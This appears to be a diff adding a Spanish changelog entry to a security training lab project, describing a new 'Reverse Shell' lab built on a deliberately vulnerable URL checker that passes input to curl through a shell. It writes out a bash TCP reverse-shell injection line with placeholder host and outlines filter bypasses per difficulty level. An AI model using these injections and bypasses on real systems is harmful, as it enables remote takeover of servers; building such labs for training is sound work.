@@ -1,3 +1,13 @@
+## 2026-04-30 — Nuevo lab: Reverse Shell
+
+- feat(reverse_shell): Nuevo laboratorio "Reverse Shell" en categoría Vulnerabilidades (riesgo critical).
+  - Mecanica: "URL Health Checker" vulnerable que ejecuta `curl ... {url}` con `shell=True`.
+  - Easy: sin filtrado, bash TCP reverse shell directo (`; bash -i >& /dev/tcp/IP/PORT 0>&1`).
+  - Medium: filtra `;` y `|`; bypass con `&&` o newline URL-encoded (`%0a`) via Burp Suite.
+  - Hard: filtra `;`, `|`, `&&`, `>`, `<`, `&`, backtick; requiere Python/Perl one-liner + `$IFS`.
+  - Resolucion bilingue (ES/EN) con payloads por dificultad, mkfifo, estabilizacion de TTY y `pty.spawn`.
+  - Deteccion de timeout como indicador de shell establecida.
+
 ## 2026-04-28 — 4 nuevos labs + mejoras a 6 labs existentes
 
 ### Nuevos labs
